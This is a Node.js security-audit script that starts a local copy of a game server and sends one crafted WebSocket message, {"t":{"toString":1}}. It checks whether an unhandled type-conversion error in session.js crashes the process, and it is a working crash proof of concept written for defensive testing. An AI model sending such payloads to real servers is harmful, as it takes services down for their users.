// Security audit (the game socket), report-only: does one game message with an object where a string is expected stop
// the server? JSON.parse('{"t":{"toString":1}}') gives an object whose toString is a number: String(x) and `${x}` throw
// "Cannot convert object to primitive value". session.js:95 does String(msg.t) outside any try/catch; ws.js emits
// 'message' from the socket's 'data' listener; nothing registers process.on('uncaughtException').
// Runs a private server on 127.0.0.1 (today's city, a temp data dir), joins as a new guest (hello, no token), sends
// {"t":{"toString":1}}, and prints whether the server lived. Never asserts, never fixes.
//   node --max-old-space-size=3072 tools/audit/sec-acct-wscrash.mjs [json-to-send]
import { spawn } from 'node:child_process';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const PORT = 19000 + Math.floor(Math.random() * 1000);
const PAYLOAD = process.argv[2] || '{"t":{"toString":1}}';
const dataDir = mkdtempSync(join(tmpdir(), 'cla-sec-ws-'));
const env = { ...process.env, PORT: String(PORT), HOST: '127.0.0.1', CLA_DATA_DIR: dataDir, CLA_ART_THREADS: '0', CLA_SECRET: 'audit-secret', CLA_WORLD: 'today' };
delete env.NODE_ENV;
const srv = spawn(process.execPath, ['--max-old-space-size=3072', join(ROOT, 'server', 'index.js')], { cwd: ROOT, env, stdio: ['ignore', 'pipe', 'pipe'] });
let out = '', exited = null;
srv.stdout.on('data', (d) => { out += d; });
srv.stderr.on('data', (d) => { out += d; });
srv.on('exit', (code, sig) => { exited = { code, sig }; });
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const t0 = Date.now();
while (!/listening on/.test(out) && !exited && Date.now() - t0 < 240e3) await sleep(500);
if (!/listening on/.test(out)) { console.log('server did not come up:', exited, out.slice(-800)); srv.kill(); process.exit(0); }
console.log(`server up on 127.0.0.1:${PORT}`);
const ws = new WebSocket(`ws://127.0.0.1:${PORT}/ws`);
let welcomed = false, closed = null;
ws.onmessage = (e) => { if (typeof e.data === 'string' && e.data.startsWith('{"t":"welcome"')) welcomed = true; };
ws.onclose = (e) => { closed = e.code; };
ws.onopen = () => ws.send(JSON.stringify({ t: 'hello', token: null }));
const t1 = Date.now();
while (!welcomed && !closed && Date.now() - t1 < 20e3) await sleep(100);
console.log('joined as a new guest:', welcomed ? 'yes' : `no (closed ${closed})`);
if (welcomed) {
  console.log('sending', PAYLOAD);
  ws.send(PAYLOAD);
  await sleep(2000);
}
console.log('server process:', exited ? `EXITED (code ${exited.code}, signal ${exited.sig})` : 'still running', '| socket closed:', closed);
const tail = out.split('\n').filter((l) => /TypeError|Cannot convert|at .*session\.js|at .*ws\.js/.test(l)).slice(0, 5);
if (tail.length) console.log('server output:\n  ' + tail.join('\n  '));
try { ws.close(); } catch { /* gone */ }
if (!exited) srv.kill();
setTimeout(() => process.exit(0), 300);
